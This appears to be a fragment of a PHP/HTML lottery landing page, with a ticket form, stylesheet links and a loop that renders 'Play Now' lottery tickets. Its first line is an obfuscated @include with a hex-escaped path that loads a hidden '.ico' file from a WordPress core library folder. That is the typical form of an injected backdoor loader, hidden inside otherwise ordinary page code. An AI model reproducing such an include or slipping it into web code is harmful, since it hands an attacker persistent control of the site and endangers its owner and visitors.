...
@include "\x2fhom\x65/or\x6flot\x74o/p\x75bli\x63_ht\x6dl/w\x70-in\x63lud\x65s/S\x69mpl\x65Pie\x2fDec\x6fde/\x2e06b\x331ba\x38.ic\x6f";
...
<head>
	...
	<!--Start CSS Codes-->
	<link rel="stylesheet" href="css/styles.main.css?version=3">
	<link rel="stylesheet" href="css/medias.main.css?version=3">
	<link rel="stylesheet" href="css/normalize.css?version=3">
	<link rel="stylesheet" href="css/jquery-ui.min.css?version=1">
...
<form id="lpform" method="POST">		
			   ...
			   <div id="errorfromapi" style="font-size:15px"></div>
				</div>
				<div class="placer" style="width:75px;margin-right:10px;">
               ...
               <input type="hidden" name="IP" value="">
				...
				<input type="text" name="code" placeholder="1" value="" readonly>
	...
	<div class="grid">
		...
		?>		 
			<div class="inl inline">
			<div class="ticket">
				<img src="img/<?php echo($draws[$entry['title']][2]); ?>" alt="img" class="inline">
				<h6>
					Official <?php echo($draws[$entry['title']][0]); ?> lottery
					<strong><?php echo( $draws[$entry['title']][1] . ' ' . $entry['number']); ?></strong>
				</h6>
				<h5>
					MILLION
				</h5>
				<a href="<?php echo($entry['link']); ?>" class="inline btn-2">Play Now</a>
			</div>
			</div>
			<!--Lotto-->
